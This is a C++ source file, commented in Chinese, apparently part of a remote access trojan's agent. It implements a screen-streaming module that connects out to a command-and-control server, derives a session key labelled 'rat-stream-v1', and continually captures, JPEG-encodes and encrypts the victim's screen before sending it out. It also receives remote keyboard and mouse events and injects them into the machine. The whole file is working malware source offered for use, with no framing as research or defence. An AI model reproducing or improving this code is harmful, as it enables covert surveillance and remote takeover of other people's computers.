// screen_stream.cpp — 屏幕流长连接实现（协议 §9）
// Agent 收到 RMT_SCREEN_STREAM 后外连 c2server:4445：
//   握手(StreamHello/Ack) → 派生 stream_key → 帧循环(抓屏+JPEG+加密上行)
//   + 输入事件接收(解密 → SendInput 注入)
#include "screen_stream.h"

#include "crypto.h"
#include "desktop_switch.h"
#include "input_replay.h"
#include "net.h"
#include "protocol.h"
#include "screen_spy.h"
#include "session.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <bcrypt.h>
#include <wincodec.h>
#include <wrl/client.h>

#include <atomic>
#include <cstdio>
#include <cstring>
#include <process.h>
#include <string>
#include <vector>

namespace c2 {

namespace {

using Microsoft::WRL::ComPtr;

std::string g_host;
AgentConfig g_cfg;
std::atomic<bool> g_running{false};      // 期望运行（stop / 线程自身都可清）
std::atomic<bool> g_thread_alive{false}; // 流线程存活（start 占位、线程退出时清零）
float g_stream_scale = 1.0f;             // 抓屏缩放（帧尺寸 = 屏幕 × scale）
int g_stream_fps = 25;                   // 帧率上限（由 0x1002 参数决定）
int g_stream_quality = 70;               // JPEG 质量（由 0x1002 参数决定）
HANDLE g_thread = nullptr;

// 回收已退出线程的句柄（stop 超时后会留下句柄，等线程真正退出再关）
void reap_finished_thread() {
    if (g_thread && !g_thread_alive.load()) {
        WaitForSingleObject(g_thread, 0);
        CloseHandle(g_thread);
        g_thread = nullptr;
    }
}

// ---- 输入事件接收：自持重装缓冲 ----
// 原实现用 net_read_packet(..., 50) 轮询：一旦 50ms 超时且只读到半个包，
// 已消费的头部/部分载荷会丢失，字节流错位（输入事件静默丢失）。
// 这里改为"先把字节读进本地缓冲，再从缓冲里切完整包"，未读满的字节留待下次。
class InputStream {
public:
    explicit InputStream(SOCKET s) : sock_(s) {}

    // 取一个完整包：成功 true；本次没有完整包返回 false（缓冲保留）；异常置 broken
    bool poll(Header& h, std::vector<uint8_t>& payload, int wait_ms) {
        if (parse_one(h, payload))
            return true;
        if (broken_)
            return false;
        fd_set rf;
        FD_ZERO(&rf);
        FD_SET(sock_, &rf);
        timeval tv{wait_ms / 1000, (wait_ms % 1000) * 1000};
        if (select(0, &rf, nullptr, nullptr, &tv) <= 0)
            return false; // 本次无数据（或等待超时）
        char tmp[16384];
        int n = recv(sock_, tmp, (int)sizeof(tmp), 0);
        if (n <= 0) {
            broken_ = true;
            return false;
        }
        buf_.insert(buf_.end(), tmp, tmp + n);
        return parse_one(h, payload);
    }

    bool broken() const { return broken_; }

private:
    bool parse_one(Header& h, std::vector<uint8_t>& payload) {
        if (buf_.size() < kHeaderSize)
            return false;
        std::string err;
        if (!decode_header(buf_.data(), h, err)) {
            printf("[stream] bad header in input stream: %s\n", err.c_str());
            broken_ = true;
            return false;
        }
        const size_t need = kHeaderSize + (size_t)h.payload_len;
        if (buf_.size() < need)
            return false; // 半包：保留，等下次补全
        payload.assign(buf_.begin() + kHeaderSize, buf_.begin() + need);
        buf_.erase(buf_.begin(), buf_.begin() + need);
        return true;
    }

    SOCKET sock_;
    std::vector<uint8_t> buf_;
    bool broken_ = false;
};

// ---- JPEG 编码（WIC，BGRA → JPEG 内存）----

bool encode_jpeg_bgra(int w, int h, int stride, const uint8_t* px, int quality,
                      std::vector<uint8_t>& out) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    bool needUninit = SUCCEEDED(hr);
    if (hr == RPC_E_CHANGED_MODE)
        needUninit = false;

    {
        ComPtr<IWICImagingFactory> factory;
        if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, nullptr,
                                    CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&factory)))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        ComPtr<IWICBitmap> bitmap;
        if (FAILED(factory->CreateBitmapFromMemory(w, h, GUID_WICPixelFormat32bppBGRA,
                                                   stride, (UINT)stride * h,
                                                   const_cast<BYTE*>(px),
                                                   &bitmap))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, 0);
        ComPtr<IStream> stream;
        CreateStreamOnHGlobal(hg, TRUE, &stream);

        ComPtr<IWICStream> wicStream;
        factory->CreateStream(&wicStream);
        wicStream->InitializeFromIStream(stream.Get());

        ComPtr<IWICBitmapEncoder> encoder;
        if (FAILED(factory->CreateEncoder(GUID_ContainerFormatJpeg, nullptr, &encoder)) ||
            FAILED(encoder->Initialize(wicStream.Get(), WICBitmapEncoderNoCache))) {
            if (needUninit) CoUninitialize();
            return false;
        }
        // 质量参数真正生效：通过属性包把 ImageQuality(0.0-1.0) 传给 JPEG 编码器。
        // 注意必须在 frame->Initialize 之前写入属性包，否则不生效
        // （原实现传 nullptr 且忽略 quality 形参，质量恒为 WIC 默认值）。
        const int q = quality < 1 ? 1 : (quality > 100 ? 100 : quality);
        ComPtr<IPropertyBag2> props;
        ComPtr<IWICBitmapFrameEncode> frame;
        if (FAILED(encoder->CreateNewFrame(&frame, &props))) {
            if (needUninit) CoUninitialize();
            return false;
        }
        if (props) {
            PROPBAG2 opt{};
            opt.pstrName = (LPOLESTR)L"ImageQuality";
            VARIANT v;
            VariantInit(&v);
            v.vt = VT_R4;
            v.fltVal = (float)q / 100.0f;
            props->Write(1, &opt, &v);
            VariantClear(&v);
        }
        if (FAILED(frame->Initialize(props.Get()))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        if (FAILED(frame->WriteSource(bitmap.Get(), nullptr)) ||
            FAILED(frame->Commit()) || FAILED(encoder->Commit())) {
            if (needUninit) CoUninitialize();
            return false;
        }
        STATSTG st{};
        stream->Stat(&st, STATFLAG_NONAME);
        ULARGE_INTEGER size = st.cbSize;
        out.resize((size_t)size.QuadPart);
        ULONG read = 0;
        stream->Seek({0, 0}, STREAM_SEEK_SET, nullptr);
        stream->Read(out.data(), (ULONG)out.size(), &read);
        out.resize(read);
    }  // 所有 ComPtr 在此析构

    if (needUninit) CoUninitialize();
    return !out.empty();
}

// 屏幕流线程
// 屏幕流线程：握手 → 帧循环 + 输入接收
unsigned __stdcall stream_proc(void* param) {
    (void)param;
    // 无论从哪条路径退出，都要清掉运行/存活标志（否则一次失败后再也起不来）
    struct ThreadGuard {
        ~ThreadGuard() {
            g_running.store(false);
            g_thread_alive.store(false);
        }
    } guard;
    printf("[stream] connecting to %s:%u...\n", g_host.c_str(), kStreamPort);

    SOCKET sock = INVALID_SOCKET;
    if (!net_connect(g_host, kStreamPort, &sock, 5000)) {
        printf("[stream] connect failed\n");
        return 1;
    }

    // 握手（明文）：StreamHello(agent_id + client_nonce) → StreamAck(server_nonce)
    uint8_t client_nonce[kClientNonceLen];
    BCryptGenRandom(nullptr, client_nonce, kClientNonceLen,
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    std::vector<uint8_t> hello(kAgentIdLen + kClientNonceLen);
    std::memcpy(hello.data(), g_cfg.agent_id, kAgentIdLen);
    std::memcpy(hello.data() + kAgentIdLen, client_nonce, kClientNonceLen);
    Header h;
    h.cmd = kCmdStreamHello;
    if (!net_write_packet(sock, h, hello.data(), hello.size())) {
        printf("[stream] send hello failed\n");
        net_close(sock);
        return 1;
    }
    Header ack_h;
    std::vector<uint8_t> ack;
    if (!net_read_packet(sock, ack_h, ack, 5000) || ack_h.cmd != kCmdStreamAck ||
        ack.size() < kServerNonceLen) {
        printf("[stream] handshake failed\n");
        net_close(sock);
        return 1;
    }
    const uint8_t* server_nonce = ack.data();
    // stream_key = HKDF(psk, agent_id||client_nonce||server_nonce, "rat-stream-v1")
    std::vector<uint8_t> salt;
    salt.insert(salt.end(), g_cfg.agent_id, g_cfg.agent_id + kAgentIdLen);
    salt.insert(salt.end(), client_nonce, client_nonce + kClientNonceLen);
    salt.insert(salt.end(), server_nonce, server_nonce + kServerNonceLen);
    std::vector<uint8_t> stream_key =
        hkdf_sha256(g_cfg.psk.data(), g_cfg.psk.size(), salt.data(), salt.size(),
                    (const uint8_t*)"rat-stream-v1", 13, kSessionKeyLen);
    printf("[stream] connected, key derived\n");

    // 帧循环（本线程内：抓屏 + 编码 + 发送；读输入在循环里轮询）
    printf("[stream] creating ScreenSpy...\n");
    ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, g_stream_scale);
    printf("[stream] ScreenSpy created=%p\n", (void*)spy);
    if (!spy) {
        printf("[stream] ScreenSpy create failed\n");
        net_close(sock);
        return 1;
    }

    uint32_t seq = 0;
    int fps = g_stream_fps;
    if (fps < 1) fps = 1;
    if (fps > 60) fps = 60;
    const DWORD frame_interval = (DWORD)(1000 / fps);  // fps 参数生效（原为固定 25）
    uint32_t sent_frames = 0, input_events = 0;
    DWORD t0 = GetTickCount();
    DWORD next_frame = GetTickCount();
    InputStream in(sock);

    while (g_running.load()) {
        // ---- 输入轮询：只在"等待下一帧"的空档等待，最多 50ms ----
        // 不再用 net_read_packet(短超时) 直接读包：InputStream 自持重装缓冲，
        // 半包不会因超时被丢弃（原实现的错位根源）。
        DWORD now = GetTickCount();
        int wait_ms = 0;
        if ((int32_t)(now - next_frame) < 0) {
            const DWORD remain = next_frame - now;
            wait_ms = remain > 50 ? 50 : (int)remain;
        }
        Header in_h;
        std::vector<uint8_t> in_raw;
        if (in.poll(in_h, in_raw, wait_ms)) {
            if (in_h.flags & kFlagEncrypted) {
                std::vector<uint8_t> plain;
                std::string err;
                if (aes_gcm_decrypt(stream_key.data(), stream_key.size(),
                                    in_raw.data(), in_raw.size(), plain, err) &&
                    in_h.cmd == kCmdInputEvents && plain.size() >= 4) {
                    uint32_t count = 0;
                    std::memcpy(&count, plain.data(), 4);
                    if (plain.size() >= 4 + count * sizeof(InputEvent)) {
                        input_events += count;
                        replay_input_events(
                            reinterpret_cast<const InputEvent*>(plain.data() + 4),
                            count);
                        printf("[stream] injected %u input events (total %u)\n",
                               count, input_events);
                    }
                }
            }
            continue;  // 继续收包/抓下一帧
        }
        if (in.broken()) {
            printf("[stream] input channel broken\n");
            break;
        }

        // 未到下一帧：继续轮询输入（节奏由 next_frame 决定，不再固定 Sleep）
        if ((int32_t)(GetTickCount() - next_frame) < 0)
            continue;

        // ---- 抓帧 + JPEG + 发送 ----
        if (spy->grab()) {
            std::vector<uint8_t> jpeg;
            if (encode_jpeg_bgra(spy->width(), spy->height(), spy->stride(),
                                 spy->pixels(), g_stream_quality, jpeg)) {
                // 帧包明文：seq(4)+w(2)+h(2)+jpeg_len(4)+jpeg
                std::vector<uint8_t> plain;
                uint32_t w = (uint32_t)spy->width(), hh = (uint32_t)spy->height();
                for (int i = 0; i < 4; ++i) plain.push_back((uint8_t)(seq >> (8 * i)));
                plain.push_back((uint8_t)(w & 0xFF)); plain.push_back((uint8_t)(w >> 8));
                plain.push_back((uint8_t)(hh & 0xFF)); plain.push_back((uint8_t)(hh >> 8));
                uint32_t jl = (uint32_t)jpeg.size();
                for (int i = 0; i < 4; ++i) plain.push_back((uint8_t)(jl >> (8 * i)));
                plain.insert(plain.end(), jpeg.begin(), jpeg.end());

                std::vector<uint8_t> sealed;
                std::string err;
                if (aes_gcm_encrypt(stream_key.data(), stream_key.size(),
                                    plain.data(), plain.size(), sealed, err)) {
                    Header fh;
                    fh.flags = kFlagEncrypted;
                    fh.seq = seq++;
                    fh.cmd = kCmdScreenFrame;
                    if (!net_write_packet(sock, fh, sealed.data(), sealed.size())) {
                        printf("[stream] send frame #%u FAILED (conn broken)\n", seq);
                        break;
                    }
                    sent_frames++;
                    if (sent_frames == 1 || sent_frames % 25 == 0) {
                        DWORD el = GetTickCount() - t0;
                        float fps = el > 0 ? sent_frames * 1000.0f / el : 0;
                        printf("[stream] sent %u frames (%.1f fps, last jpeg=%zu B)\n",
                               sent_frames, fps, jpeg.size());
                    }
                }
            }
        }
        next_frame += frame_interval;
        // 落后过多（编码慢/机器卡顿）：重置节奏，避免持续追赶
        if ((int32_t)(GetTickCount() - next_frame) > 1000)
            next_frame = GetTickCount();
    }

    delete spy;
    net_close(sock);
    printf("[stream] stopped (sent=%u frames, injected=%u input events)\n",
           sent_frames, input_events);
    return 0;
}

}  // namespace

// 对外暴露的 JPEG 编码（截屏指令 0x1001 复用屏幕流的同一编码实现）
bool jpeg_encode_bgra(int w, int h, int stride, const uint8_t* px, int quality,
                      std::vector<uint8_t>& out) {
    return encode_jpeg_bgra(w, h, stride, px, quality, out);
}

void screen_stream_set_config(const std::string& host, const AgentConfig& cfg) {
    g_host = host;
    g_cfg = cfg;
}

bool start_screen_stream(int fps, int quality, float scale) {
    reap_finished_thread();  // 回收上一次已退出线程的句柄
    if (g_thread_alive.load()) {
        printf("[stream] start ignored: already running\n");
        return false;  // 已在运行
    }
    // 参数生效：帧率、JPEG 质量（透传到 stream_proc / WIC 编码器）、抓屏缩放
    g_stream_fps = (fps >= 1 && fps <= 60) ? fps : 25;
    g_stream_quality = (quality >= 1 && quality <= 100) ? quality : 70;
    g_stream_scale = (scale > 0.0f) ? scale : 1.0f;
    set_input_scale(g_stream_scale);  // 关键：注入换算与抓屏缩放对齐

    g_running.store(true);
    g_thread_alive.store(true);  // 先占位：避免创建与线程入口之间的重复 start 竞态
    g_thread = (HANDLE)_beginthreadex(nullptr, 0, stream_proc, nullptr, 0, nullptr);
    if (!g_thread) {
        g_thread_alive.store(false);
        g_running.store(false);
        printf("[stream] create thread failed\n");
        return false;
    }
    printf("[stream] start requested (fps=%d quality=%d scale=%.2f thread=%p)\n",
           g_stream_fps, g_stream_quality, (double)g_stream_scale, (void*)g_thread);
    return true;
}

void stop_screen_stream() {
    printf("[stream] stop requested\n");
    g_running.store(false);
    reap_finished_thread();
    if (!g_thread) {
        printf("[stream] stop: no thread running\n");
        return;
    }
    // 线程可能在超时后仍活着：此时保留句柄、不置空，也不允许 start 起第二条线程
    if (WaitForSingleObject(g_thread, 5000) == WAIT_OBJECT_0) {
        CloseHandle(g_thread);
        g_thread = nullptr;
        g_thread_alive.store(false);
        printf("[stream] stop done\n");
    } else {
        printf("[stream] stop: thread did not exit in 5s "
               "(handle kept; 下次 start/stop 时自动回收)\n");
    }
}

}  // namespace c2
